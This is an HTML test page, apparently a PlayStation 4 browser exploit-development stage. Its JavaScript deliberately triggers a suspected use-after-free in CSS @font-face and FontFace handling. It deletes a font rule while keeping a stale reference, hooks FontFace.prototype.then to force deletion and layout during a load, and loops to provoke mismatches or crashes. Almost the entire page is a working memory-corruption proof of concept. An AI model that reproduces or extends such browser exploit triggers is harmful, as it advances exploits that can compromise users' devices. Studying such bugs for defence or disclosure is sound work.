<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Phase 3 — UAF no re-insert (13)</title>
<style>
body { font-family: monospace; background: #111; color: #0f0; padding: 12px; margin: 0; }
#status { font-size: 16px; margin-bottom: 6px; color: #ff0; }
#summary { color: #aaa; font-size: 12px; margin-bottom: 8px; line-height: 1.5; }
#log { height: 68vh; overflow: auto; border: 1px solid #333; padding: 8px; font-size: 11px; }
.ok { color: #0f0; } .bad { color: #f66; } .weird { color: #ff6; }
#t { font-family: x; font-size: 96px; color: #fff; }
</style>
<style id="s">
@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
</style>
</head>
<body>
<div id="status">running...</div>
<div id="summary">12 did NOT re-insert on purpose here — keeps stale check(B) bug. Stress only. Quit browser after.</div>
<div id="log"></div>
<div id="t">B</div>
<script>
(function () {
    var logEl = document.getElementById('log');
    window.ps4log = function (msg, cls) {
        var line = document.createElement('div');
        line.textContent = '[' + performance.now().toFixed(1) + 'ms] ' + msg;
        if (cls) line.className = cls;
        logEl.appendChild(line);
    };
    window.ps4status = function (t, c) {
        document.getElementById('status').textContent = t;
        if (c) document.getElementById('status').style.color = c;
    };
})();

var v = { p: 0, f: 0, w: 0 };
function pass(m) { v.p++; ps4log('✓ SUCCESS: ' + m, 'ok'); }
function fail(m) { v.f++; ps4log('✗ FAILED: ' + m, 'bad'); }
function weird(m) { v.w++; ps4log('! WEIRD: ' + m, 'weird'); }

var LOOPS = 8;
var q = location.search.match(/[?&]loops=(\d+)/);
if (q) LOOPS = parseInt(q[1], 10);

window.onload = function () {
    ps4log('Phase 3m — UAF stress WITHOUT re-insert (13)');
    ps4log('loops=' + LOOPS + ' — no re-insert keeps stale lookup');
    ps4log('UA: ' + navigator.userAgent);

    var sheet = document.getElementById('s').sheet;
    var staleRule = sheet.cssRules[0];
    pass('held stale ref');

    var A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
    document.fonts.add(A);
    void A.loaded;

    function oneCycle(n) {
        ps4log('--- cycle ' + n + ' ---');

        var fired = false;
        Object.defineProperty(FontFace.prototype, 'then', {
            configurable: true,
            get: function () {
                if (!fired && this === A) {
                    fired = true;
                    new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
                    new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
                    if (sheet.cssRules.length > 0) sheet.deleteRule(0);
                    document.getElementById('t').textContent = 'B';
                    document.body.offsetTop;
                    document.documentElement.offsetTop;
                }
                return undefined;
            }
        });

        document.fonts.load('1em x', 'AB');

        try { staleRule.cssText; } catch (e) { ps4log('cycle ' + n + ' stale read threw'); }

        var cb = document.fonts.check('1em x', 'B');
        if (cb) weird('cycle ' + n + ' check(B)=true after delete');
    }

    for (var i = 1; i <= LOOPS; i++) {
        oneCycle(i);
        if (i < LOOPS) {
            sheet.insertRule(
                "@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }",
                0
            );
        }
    }

    var checkB = document.fonts.check('1em x', 'B');
    ps4log('final check(B)=' + checkB);

    document.getElementById('t').textContent = 'B';
    document.body.offsetTop;

    document.fonts.load('1em x', 'B').then(function (f) {
        ps4log('final load(B) count=' + f.length);
        if (checkB && f.length === 0) pass('final: check/load mismatch (UAF-adjacent)');
        if (f.length > 0) pass('final load(B) returned faces');
    }).catch(function (e) {
        ps4log('final load(B): ' + e);
        if (checkB) weird('check(B) true but load(B) errored');
    });

    setTimeout(function () {
        ps4log('========== SUMMARY ==========');
        ps4log('Passed: ' + v.p + ' Failed: ' + v.f + ' Weird: ' + v.w);
        ps4log('No crash? Expected on 1 session. Try loops=15 or crash.html+refresh for OOM.');
        ps4status('done — weird count=' + v.w, '#0f0');
    }, 1500);
};
</script>
</body>
</html>
